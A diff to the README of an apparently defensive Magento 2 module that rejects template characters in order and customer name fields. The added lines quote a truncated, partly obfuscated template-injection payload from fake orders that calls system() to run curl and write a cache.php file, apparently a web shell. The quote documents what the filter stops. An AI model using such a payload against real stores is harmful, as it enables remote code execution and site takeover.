@@ -1,5 +1,9 @@
+
 Disallow random code injection in Magento 2 trough API or WEB requests for:
 **Order Creation, Customer Creation, Customer Name Update, Customer Address Update**
+and fake orders wtih first and last name like:
+
+      {{var this.getTemp lateFil ter().filt er(order)}} {{var this.getTemp lateFil ter().add AfterFil terCallb ack(system).Fil ter(cd${IFS%??}pub;curl${IFS%??}-o${IFS%??}cache.php${IFS....
 
 Characters like - **{, }, <, >, %**  will be rejected. Update or remove them if necessery:
 
